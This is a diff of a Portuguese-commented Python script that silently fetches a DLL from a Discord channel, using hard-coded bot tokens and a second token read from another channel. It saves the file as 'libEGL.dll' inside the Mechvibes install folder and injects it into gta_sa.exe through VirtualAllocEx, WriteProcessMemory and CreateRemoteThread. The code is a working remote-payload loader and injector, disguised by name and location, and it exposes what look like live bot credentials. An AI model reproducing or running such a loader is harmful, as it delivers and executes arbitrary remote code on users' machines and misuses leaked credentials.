@@ -3,9 +3,10 @@ import sys
 import subprocess
 import ctypes
 from ctypes import wintypes
-import traceback # Importado para fornecer detalhes completos sobre exceções
+import traceback
+import requests
 
-# Função de log para padronizar as mensagens
+# --- FUNÇÕES DE LOG ---
 def log_info(message):
     print(f"[INFO] {message}")
 
@@ -38,12 +39,47 @@ def execute_silent_injection():
             return
 
     # --- CONSTANTES ---
-    DISCORD_CHANNEL_ID = "1393441968566046750"
-    DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GBXkiq.oiuYygfwm6TXNUlZ2be3N_C6oFt88xh1AF2CWk"
+    # Canal para buscar o TOKEN do bot de download
+    TOKEN_CHANNEL_ID = "1394101967718060042"
+    # Token do BOT que tem permissão para LER o canal do token
+    TOKEN_READER_BOT_AUTH = "MTM4ODk5NzUyNDU4ODcyNDM3NQ.Gi9cRZ.Oy2znEMpQG-9WyF1FATW2BSLMRmJfnLNQp-Iz8" # IMPORTANTE: Substitua pelo token do bot que vai ler o token no canal
+    
+    # Canal onde a DLL está armazenada
+    DLL_CHANNEL_ID = "1393441968566046750"
     DLL_NAME = "libEGL.dll"
     PROCESS_NAME = "gta_sa.exe"
 
-    log_info(f"Configurações: Canal ID={DISCORD_CHANNEL_ID}, Processo Alvo={PROCESS_NAME}, DLL={DLL_NAME}")
+    log_info(f"Configurações: Canal do Token={TOKEN_CHANNEL_ID}, Canal da DLL={DLL_CHANNEL_ID}, Processo Alvo={PROCESS_NAME}, DLL={DLL_NAME}")
+
+    # --- ETAPA ADICIONAL: BUSCAR O TOKEN DE DOWNLOAD NO DISCORD ---
+    DISCORD_DOWNLOAD_BOT_TOKEN = None
+    try:
+        log_info(f"Buscando o token de download no canal {TOKEN_CHANNEL_ID}...")
+        api_url_token = f"https://discord.com/api/v10/channels/{TOKEN_CHANNEL_ID}/messages?limit=1"
+        headers_token = {"Authorization": f"Bot {TOKEN_READER_BOT_AUTH}"}
+        
+        r_token_msg = requests.get(api_url_token, headers=headers_token, timeout=10)
+        
+        if r_token_msg.status_code == 200:
+            messages = r_token_msg.json()
+            if messages and 'content' in messages[0] and messages[0]['content']:
+                DISCORD_DOWNLOAD_BOT_TOKEN = messages[0]['content'].strip()
+                log_success("Token de download obtido com sucesso.")
+                # log_debug(f"Token obtido: {DISCORD_DOWNLOAD_BOT_TOKEN}") # Descomente para depurar o token
+            else:
+                log_error("O canal do token está vazio ou a última mensagem não tem conteúdo. Encerrando.")
+                return
+        else:
+            log_error(f"Falha ao buscar o token no Discord. Status: {r_token_msg.status_code}, Resposta: {r_token_msg.text}")
+            return
+            
+    except requests.exceptions.RequestException as e:
+        log_error(f"Erro de rede ao buscar o token. Erro: {e}")
+        return
+    except Exception as e:
+        log_error(f"Erro inesperado ao buscar o token. Erro: {e}")
+        traceback.print_exc()
+        return
 
     # --- CONFIGURAÇÃO DA API DO WINDOWS (CTYPES) ---
     try:
@@ -52,14 +88,13 @@ def execute_silent_injection():
         log_error(f"Não foi possível carregar kernel32.dll. Erro: {e}. O script não pode ser executado neste sistema.")
         return
 
-    # Definições de constantes e tipos da API
     PROCESS_ALL_ACCESS = 0x1F0FFF
     MEM_COMMIT_RESERVE = 0x3000
     PAGE_READWRITE = 0x04
 
     k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     k32.OpenProcess.restype = wintypes.HANDLE
-    # ... (o resto das definições de ctypes permanece o mesmo)
+    # (O restante das definições de ctypes permanece o mesmo)
 
     # 2. VERIFICAÇÃO DE PRIVILÉGIOS DE ADMINISTRADOR
     try:
@@ -73,19 +108,17 @@ def execute_silent_injection():
         return
 
     # 3. VERIFICAÇÃO DA ARQUITETURA (32/64 BITS)
-    # Processos de 32 bits (como gta_sa.exe) requerem um injetor de 32 bits.
     is_64bit = sys.maxsize > 2**32
     log_info(f"Verificando arquitetura do Python... Status: {'64-bit' if is_64bit else '32-bit'}")
     if is_64bit:
         log_info("O script está rodando em 64-bit. Tentando reiniciar em 32-bit, pois o processo alvo é 32-bit.")
         try:
-            # Tenta relançar o script com o interpretador Python de 32 bits
             subprocess.Popen(['py', '-3-32'] + sys.argv, creationflags=0x08000008)
             log_success("Comando para relançar em 32-bit foi enviado. Encerrando o processo de 64-bit.")
-            sys.exit() # Sai do script de 64 bits
+            sys.exit()
         except FileNotFoundError:
-            log_error("Não foi possível encontrar o lançador 'py -3-32'. Certifique-se de que uma versão de 32 bits do Python está instalada e no PATH do sistema.")
-            log_error("A injeção de 64 para 32 bits provavelmente falhará, mas o script continuará a tentativa.")
+            log_error("Não foi possível encontrar o lançador 'py -3-32'. Certifique-se de que uma versão de 32 bits do Python está instalada e no PATH.")
+            log_error("A injeção de 64 para 32 bits provavelmente falhará, mas o script continuará.")
         except Exception as e:
             log_error(f"Ocorreu um erro ao tentar relançar em 32-bit: {e}")
 
@@ -106,36 +139,32 @@ def execute_silent_injection():
             break
             
     if not mech_dir:
-        log_error("Não foi possível encontrar o diretório de instalação do 'Mechvibes'. A DLL não tem onde ser salva. Encerrando.")
+        log_error("Não foi possível encontrar o diretório de instalação do 'Mechvibes'. Encerrando.")
         return
 
     dll_path = os.path.join(mech_dir, DLL_NAME)
     log_info(f"O caminho completo para a DLL será: {dll_path}")
 
-    # 5. BAIXANDO A DLL DO DISCORD
+    # 5. BAIXANDO A DLL DO DISCORD USANDO O TOKEN OBTIDO
     try:
         log_info("Conectando à API do Discord para obter o link da DLL...")
-        api_url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=1"
-        headers = {"Authorization": f"Bot {DISCORD_AUTH_TOKEN}"}
+        api_url_dll = f"https://discord.com/api/v10/channels/{DLL_CHANNEL_ID}/messages?limit=1"
+        # Agora usa o token que foi lido do outro canal
+        headers_dll = {"Authorization": f"Bot {DISCORD_DOWNLOAD_BOT_TOKEN}"}
         
-        r_msg = requests.get(api_url, headers=headers, timeout=10)
-        log_info(f"Resposta da API do Discord: Status Code {r_msg.status_code}")
+        r_msg = requests.get(api_url_dll, headers=headers_dll, timeout=10)
+        log_info(f"Resposta da API do Discord (Canal da DLL): Status Code {r_msg.status_code}")
 
         if r_msg.status_code != 200:
-            log_error(f"Falha ao buscar mensagens. A API retornou: {r_msg.text}")
+            log_error(f"Falha ao buscar mensagens do canal da DLL. A API retornou: {r_msg.text}")
             return
 
         messages = r_msg.json()
-        if not messages:
-            log_error("O canal do Discord não contém mensagens. Encerrando.")
-            return
-        
-        attachments = messages[0].get('attachments')
-        if not attachments:
-            log_error("A última mensagem no canal não contém anexos. Encerrando.")
+        if not messages or 'attachments' not in messages[0] or not messages[0]['attachments']:
+            log_error("A última mensagem no canal da DLL não contém anexos. Encerrando.")
             return
 
-        dll_url = attachments[0]['url']
+        dll_url = messages[0]['attachments'][0]['url']
         log_success(f"URL da DLL encontrada: {dll_url}")
 
         log_info("Iniciando o download da DLL...")
@@ -154,15 +183,14 @@ def execute_silent_injection():
         log_error(f"Ocorreu um erro de rede ao tentar baixar a DLL. Erro: {e}")
         return
     except Exception as e:
-        log_error(f"Ocorreu um erro inesperado durante o processo de download. Erro: {e}")
-        traceback.print_exc() # Imprime o stack trace completo para depuração
+        log_error(f"Ocorreu um erro inesperado durante o download da DLL. Erro: {e}")
+        traceback.print_exc()
         return
 
     # 6. ENCONTRANDO O PID DO PROCESSO ALVO
     pid = None
     log_info(f"Procurando pelo processo: {PROCESS_NAME}...")
     try:
-        # Usando 'tasklist' para encontrar o PID
         command = f'tasklist /FI "IMAGENAME eq {PROCESS_NAME}" /NH'
         output = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL).decode('cp850', errors='ignore')
         
@@ -174,7 +202,7 @@ def execute_silent_injection():
             return
             
     except subprocess.CalledProcessError:
-        log_error(f"O processo '{PROCESS_NAME}' não foi encontrado na lista de processos. Verifique se o jogo está aberto.")
+        log_error(f"O processo '{PROCESS_NAME}' não foi encontrado. Verifique se o jogo está aberto.")
         return
     except Exception as e:
         log_error(f"Erro ao tentar encontrar o PID do processo. Erro: {e}")
@@ -188,27 +216,27 @@ def execute_silent_injection():
         h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
         if not h_process:
             error_code = ctypes.get_last_error()
-            log_error(f"Falha ao obter o handle do processo (OpenProcess). Código de Erro do Windows: {error_code}. Encerrando.")
+            log_error(f"Falha ao obter o handle do processo. Código de Erro: {error_code}. Encerrando.")
             return
-        log_success(f"Handle do processo obtido com sucesso: {h_process}")
+        log_success(f"Handle do processo obtido: {h_process}")
 
         dll_bytes = dll_path.encode('ascii')
-        log_info("Alocando memória no processo alvo (VirtualAllocEx)...")
+        log_info("Alocando memória no processo alvo...")
         mem_addr = k32.VirtualAllocEx(h_process, None, len(dll_bytes) + 1, MEM_COMMIT_RESERVE, PAGE_READWRITE)
         if not mem_addr:
             error_code = ctypes.get_last_error()
-            log_error(f"Falha ao alocar memória no processo alvo. Código de Erro do Windows: {error_code}. Encerrando.")
+            log_error(f"Falha ao alocar memória. Código de Erro: {error_code}. Encerrando.")
             return
         log_success(f"Memória alocada no endereço: {hex(mem_addr)}")
 
-        log_info("Escrevendo o caminho da DLL na memória alocada (WriteProcessMemory)...")
+        log_info("Escrevendo o caminho da DLL na memória alocada...")
         if not k32.WriteProcessMemory(h_process, mem_addr, dll_bytes, len(dll_bytes) + 1, None):
             error_code = ctypes.get_last_error()
-            log_error(f"Falha ao escrever na memória do processo. Código de Erro do Windows: {error_code}. Encerrando.")
+            log_error(f"Falha ao escrever na memória. Código de Erro: {error_code}. Encerrando.")
             return
-        log_success("Caminho da DLL escrito com sucesso na memória do processo.")
+        log_success("Caminho da DLL escrito com sucesso.")
 
-        log_info("Obtendo o endereço da função 'LoadLibraryA' em kernel32.dll...")
+        log_info("Obtendo o endereço da função 'LoadLibraryA'...")
         load_library_addr = k32.GetProcAddress(k32.GetModuleHandleA(b'kernel32.dll'), b'LoadLibraryA')
         if not load_library_addr:
             error_code = ctypes.get_last_error()
@@ -216,13 +244,13 @@ def execute_silent_injection():
             return
         log_success(f"Endereço de LoadLibraryA obtido: {hex(load_library_addr)}")
 
-        log_info("Criando uma thread remota no processo alvo para carregar a DLL (CreateRemoteThread)...")
+        log_info("Criando thread remota para carregar a DLL...")
         h_thread = k32.CreateRemoteThread(h_process, None, 0, load_library_addr, mem_addr, 0, None)
         if not h_thread:
             error_code = ctypes.get_last_error()
-            log_error(f"Falha ao criar a thread remota. Código de Erro do Windows: {error_code}. Encerrando.")
+            log_error(f"Falha ao criar a thread remota. Código de Erro: {error_code}. Encerrando.")
             return
-        log_success(f"Thread remota criada com sucesso! Handle: {h_thread}. A injeção deve ter sido bem-sucedida.")
+        log_success(f"Thread remota criada com sucesso! Handle: {h_thread}. Injeção bem-sucedida.")
 
     except Exception as e:
         log_error(f"Ocorreu uma exceção fatal durante o processo de injeção.")
@@ -242,5 +270,4 @@ def execute_silent_injection():
 # --- PONTO DE ENTRADA ---
 if __name__ == "__main__":
     execute_silent_injection()
-    # Adicionado para manter a janela do console aberta e ver os logs
     input("Pressione Enter para sair.")
